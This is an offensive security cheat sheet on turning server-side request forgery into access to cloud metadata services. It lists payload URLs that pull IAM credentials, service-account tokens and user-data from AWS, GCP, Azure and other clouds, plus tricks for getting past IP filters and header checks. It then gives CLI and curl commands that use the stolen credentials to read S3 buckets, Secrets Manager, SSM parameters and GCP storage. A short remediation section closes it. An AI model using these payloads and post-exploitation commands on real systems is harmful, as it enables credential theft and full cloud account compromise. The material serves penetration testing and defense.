# SSRF to Cloud Metadata (AWS / GCP / Azure)

## Overview
Cloud providers expose an Instance Metadata Service (IMDS) on a non-routable link-local IP address (169.254.169.254) that is reachable only from within the virtual machine. When a server-side request forgery vulnerability exists, an attacker can direct the application to query this endpoint and retrieve IAM role credentials, instance identity documents, network configuration, and user-data scripts — often containing hardcoded secrets. This is one of the most impactful SSRF exploitation paths, frequently leading to full cloud account compromise.

## How It Works
The metadata endpoint is accessible via HTTP on `http://169.254.169.254/` (AWS, GCP, Azure) or the newer Azure IMDS at the same IP. AWS IMDSv1 (the legacy version) requires no authentication and returns credentials for any attached IAM role in plaintext JSON. GCP and Azure have similar unauthenticated endpoints. An SSRF payload that causes the server to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME` returns `AccessKeyId`, `SecretAccessKey`, and `Token` — valid temporary AWS credentials that can be used immediately with the AWS CLI.

## Impact
- Steal temporary IAM role credentials (AWS), service account tokens (GCP), or managed identity tokens (Azure)
- Pivot from instance-level SSRF to full cloud account takeover
- Access S3 buckets, RDS databases, Secrets Manager, SSM Parameter Store with stolen credentials
- Retrieve user-data scripts that often contain passwords, bootstrap secrets, or SSH keys
- Read VPC network configuration, security group IDs, and internal topology
- Forge instance identity for lateral movement within the cloud environment
- In GCP: access the OAuth token for the attached service account

## Where to Look
- Any URL parameter in applications deployed on cloud infrastructure (AWS EC2, ECS, Lambda, GCP Compute, Azure VM, App Service)
- Image fetch, URL preview, webhook, and import-from-URL features
- Check whether the application is cloud-hosted before escalating SSRF to metadata access
- Look for cloud-specific headers in server responses: `X-Amzn-Requestid`, `X-Goog-*`, `X-MSEdge-*`
- `/etc/resolv.conf` or `/etc/hosts` content (via file:// SSRF) revealing cloud DNS like `169.254.169.253`

## Testing Steps
1. Confirm SSRF exists by getting a callback to your OOB listener.
2. Determine which cloud provider hosts the server (check response headers, TLS certificate SANs, Shodan, or error messages).
3. Try the base metadata URL:
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - GCP: `http://169.254.169.254/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header — attempt header injection)
   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true` header)
4. For AWS IMDSv1 (no token required):
   a. `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — lists attached role names
   b. `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME` — returns credentials
5. For AWS IMDSv2 (requires session token): check if IMDSv2 is enforced — if not, IMDSv1 still works.
6. Extract `AccessKeyId`, `SecretAccessKey`, `Token` from the response.
7. Configure AWS CLI with stolen credentials and verify access: `aws sts get-caller-identity`
8. Enumerate accessible resources: S3 buckets, EC2, Secrets Manager, etc.
9. Also retrieve: `http://169.254.169.254/latest/user-data` (may contain passwords/scripts)

## Payloads / Techniques

```
# === AWS EC2 IMDS ===

# List all metadata keys
http://169.254.169.254/latest/meta-data/

# Instance identity / region / account ID
http://169.254.169.254/latest/dynamic/instance-identity/document

# List IAM role names attached to this instance
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials for a specific role (replace ROLE-NAME)
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# User-data (bootstrap scripts, often contains secrets)
http://169.254.169.254/latest/user-data

# Network info
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/hostname

# SSH public key
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key

# Security groups
http://169.254.169.254/latest/meta-data/security-groups

# === AWS ECS Task Metadata ===
# When inside an ECS container
http://169.254.170.2/v2/credentials/GUID
# GUID from environment variable AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

# === GCP Compute Engine IMDS ===
# Requires Metadata-Flavor: Google header — attempt CRLF injection or use redirect
http://169.254.169.254/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
http://169.254.169.254/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env  # GKE secrets

# GCP alternative endpoint
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# === Azure IMDS ===
# Requires Metadata: true header
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# === DigitalOcean Droplet Metadata ===
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data

# === Oracle Cloud Infrastructure ===
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v2/instance/  # v2 requires auth header
```

```bash
# After obtaining AWS credentials from SSRF response:
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=abc123...
export AWS_SESSION_TOKEN=FQoGZXIvYXdzE...

# Verify identity
aws sts get-caller-identity

# List S3 buckets
aws s3 ls

# Get secrets from Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRETNAME

# Get SSM parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# List EC2 instances in all regions
aws ec2 describe-instances --region us-east-1

# Check permissions (what can this role do?)
aws iam get-role --role-name ROLENAME
aws iam list-attached-role-policies --role-name ROLENAME
```

```bash
# GCP: Use stolen OAuth token
TOKEN="ya29.c...."
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=PROJECT-ID"
```

## Burp Suite Tips
- When the SSRF reflects responses, use **Repeater** to iteratively enumerate the metadata tree: first fetch the root path (returns a list), then append each key listed.
- If the app strips or blocks `169.254.169.254` as a string, try bypass techniques (decimal IP `2852039166`, hex `0xa9fea9fe`, dotless-decimal) — see ssrf_filter_bypass.md.
- For GCP/Azure that require specific headers (`Metadata-Flavor: Google`, `Metadata: true`), attempt **CRLF injection** in the URL or use a redirect server that adds the necessary headers.
- Use **Collaborator** first to confirm OOB SSRF, then pivot to metadata endpoints.
- **Save Responses** in Repeater history to reconstruct the full metadata tree.

## Tools
- Burp Suite Pro (Repeater, Collaborator)
- AWS CLI (`aws sts get-caller-identity`, `aws s3 ls`)
- Pacu (https://github.com/RhinoSecurityLabs/pacu) — AWS post-exploitation framework
- GCPwn (https://github.com/NetSPI/gcpwn) — GCP post-exploitation
- MicroBurst (https://github.com/NetSPI/MicroBurst) — Azure post-exploitation
- SSRFmap — automated metadata endpoint exploitation
- curl with `-L` flag (follow redirects) for redirect-based filter bypass

## Remediation
- **AWS**: Enforce IMDSv2 by requiring the PUT token request before any metadata GET. Set `HttpTokens: required` on all EC2 instances. Use `aws ec2 modify-instance-metadata-options`.
- **GCP**: Enable the `SECURE` metadata endpoint and restrict access to metadata at the instance level.
- **Azure**: Rely on Managed Identities instead of IMDS where possible; restrict outbound access to `169.254.169.254` via NSG rules for application-tier VMs.
- Apply egress firewall rules blocking `169.254.169.254` and `metadata.google.internal` from application servers.
- Use the principle of least privilege for IAM roles attached to compute instances.
- Implement SSRF protections: block RFC1918 + link-local ranges in URL validation, resolve hostnames and recheck IPs.

## References
https://portswigger.net/web-security/ssrf#ssrf-attacks-against-the-server-itself
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-security.html
https://cloud.google.com/compute/docs/metadata/overview
https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-cloud-instances
https://rhinosecuritylabs.com/aws/how-to-exploit-ssrf-to-get-aws-credentials/
https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
